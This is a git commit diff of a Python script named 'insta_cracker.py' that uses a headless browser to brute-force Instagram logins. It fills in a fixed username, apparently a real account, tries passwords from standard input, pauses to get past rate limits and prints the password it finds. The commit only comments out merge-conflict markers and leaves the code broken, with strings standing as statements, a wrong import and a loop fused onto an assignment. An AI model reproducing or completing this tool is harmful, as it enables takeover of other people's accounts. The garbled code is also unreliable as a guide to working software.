02a40fe94951477beafd241067c8fc599f41fdec
damon bagheri <damonbagheri@gmail.com>
2023-03-16 10:04:57 +0330

    d

--- insta_cracker.py
+++ insta_cracker.py
@@ -1,15 +1,15 @@
 #!/bin/python
-<<<<<<< HEAD
+#<<<<<<< HEAD
 #from splinter import Browser
-=======
+#=======
 #from tkinter import Browser
->>>>>>> 4acfaa876b6d87300f7b5c8d6d830f1d2174ff85
+#>>>>>>> 4acfaa876b6d87300f7b5c8d6d830f1d2174ff85
 import time
 import sys
-<<<<<<< Updated upstream
+#<<<<<<< Updated upstream
 from tkinter import Browser
-=======
->>>>>>> Stashed changes
+#=======
+#>>>>>>> Stashed changes
 wait_time = (11 * 60 + 35) # 11 mins and 35 seconds
 problem_logging_in = "There was a problem logging you into Instagram. Please try again soon."
 
@@ -18,7 +18,7 @@ def logInSuccess(Browser):
     pass_err_msg = "Sorry, your password was incorrect. Please double-check your password."
     return not(Browser.is_text_present(user_err_msg) or Browser.is_text_present(pass_err_msg))
 
-<<<<<<< Updated upstream
+#<<<<<<< Updated upstream
 ("account_username =sys.argv[1]")
 "with Browser('firefox', headless=True) to with Browser('chrome', headless=True)"
 Browser.visit('https://www.instagram.com')
@@ -27,19 +27,18 @@ username_form = Browser.find_by_name('username').first
 password_form = Browser.find_by_name('password').first
 login_button = Browser.find_by_text('Log in').first
 username_form.fill("istanbul_solmaz")
-for password in sys.stdin:
-=======
-correctPassword = None
-("ccount_username =sys.argv[1]")
+for password in sys.stdin:correctPassword = None
+#=======
+("account_username =sys.argv[1]")
 with Browser('firefox', headless=True) as browser:
     browser.visit('https://www.instagram.com')
     browser.find_by_text("Log in").first.click()
     username_form = browser.find_by_name('username').first
     password_form = browser.find_by_name('password').first
     login_button = browser.find_by_text('Log in').first
-    username_form.fill(account_username)
+    username_form.fill('account_username')
     for password in sys.stdin:
->>>>>>> Stashed changes
+#>>>>>>> Stashed changes
         if len(password) < 6:
             print('Skipping password: ' + password)
             continue
@@ -58,12 +57,10 @@ with Browser('firefox', headless=True) as browser:
             break
 if correctPassword == None:
         print("Unable to find correct password.")
-<<<<<<< Updated upstream
+#<<<<<<< Updated upstream
 else:
         print("Password for username: istanbul_solmaz  =  + password")
-=======
-    else:
-        print("Password for username: " + account_username + " = " + password)
->>>>>>> Stashed changes
-
-
+#=======
+#else:
+        print("Password for username:  + account_username  =  + password")
+#>>>>>>> Stashed changes
